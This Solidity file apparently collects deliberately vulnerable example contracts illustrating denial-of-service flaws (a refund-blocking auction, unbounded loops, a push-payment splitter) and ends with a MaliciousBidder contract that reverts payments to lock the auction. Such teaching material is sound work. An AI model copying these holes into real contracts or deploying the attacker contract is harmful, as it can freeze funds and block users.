// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Denial of Service Vulnerability Examples
 * @dev VULNERABLE - DO NOT USE IN PRODUCTION
 *
 * This contract demonstrates various DoS attack vectors.
 */
contract VulnerableAuction {
    address public currentLeader;
    uint256 public currentBid;

    // VULNERABLE: DoS by refusing payment
    function bid() public payable {
        require(msg.value > currentBid, "Bid too low");

        // VULNERABILITY: Refund can fail, blocking new bids
        if (currentLeader != address(0)) {
            payable(currentLeader).transfer(currentBid);
        }

        currentLeader = msg.sender;
        currentBid = msg.value;
    }
}

/**
 * @title DoS by Gas Limit
 * @dev Shows unbounded loop vulnerability
 */
contract VulnerableDistributor {
    address[] public shareholders;
    mapping(address => uint256) public shares;

    function addShareholder(address _shareholder, uint256 _shares) public {
        shareholders.push(_shareholder);
        shares[_shareholder] = _shares;
    }

    // VULNERABLE: Unbounded loop can exceed gas limit
    function distributeRewards() public payable {
        uint256 totalShares = 0;

        // VULNERABILITY: As shareholders array grows, this can exceed gas limit
        for (uint256 i = 0; i < shareholders.length; i++) {
            totalShares += shares[shareholders[i]];
        }

        for (uint256 i = 0; i < shareholders.length; i++) {
            uint256 reward = (msg.value * shares[shareholders[i]]) / totalShares;
            payable(shareholders[i]).transfer(reward);
        }
    }
}

/**
 * @title DoS by Block Gas Limit
 * @dev Shows vulnerability with array operations
 */
contract VulnerableRegistry {
    address[] public users;
    mapping(address => bool) public registered;

    function register() public {
        require(!registered[msg.sender], "Already registered");
        users.push(msg.sender);
        registered[msg.sender] = true;
    }

    // VULNERABLE: Deleting large arrays consumes massive gas
    function reset() public {
        // VULNERABILITY: Can exceed block gas limit with large arrays
        for (uint256 i = 0; i < users.length; i++) {
            registered[users[i]] = false;
        }
        delete users;
    }

    // VULNERABLE: Unbounded iteration
    function getUserCount() public view returns (uint256) {
        uint256 count = 0;
        // VULNERABILITY: Reading entire array can exceed gas limit
        for (uint256 i = 0; i < users.length; i++) {
            if (registered[users[i]]) {
                count++;
            }
        }
        return count;
    }
}

/**
 * @title DoS by External Contract
 * @dev Shows vulnerability from calling malicious contracts
 */
contract VulnerablePaymentSplitter {
    address[] public recipients;

    function addRecipient(address _recipient) public {
        recipients.push(_recipient);
    }

    // VULNERABLE: One malicious recipient can block all payments
    function splitPayment() public payable {
        uint256 share = msg.value / recipients.length;

        // VULNERABILITY: If any recipient reverts, all payments fail
        for (uint256 i = 0; i < recipients.length; i++) {
            payable(recipients[i]).transfer(share);
        }
    }
}

/**
 * @title Malicious Recipient for DoS Attack
 * @dev Contract that rejects payments to cause DoS
 */
contract MaliciousBidder {
    VulnerableAuction public auction;

    constructor(address _auctionAddress) {
        auction = VulnerableAuction(_auctionAddress);
    }

    function attack() public payable {
        auction.bid{value: msg.value}();
    }

    // Reject all payments - this prevents anyone else from bidding
    receive() external payable {
        revert("I will never give up my lead!");
    }
}
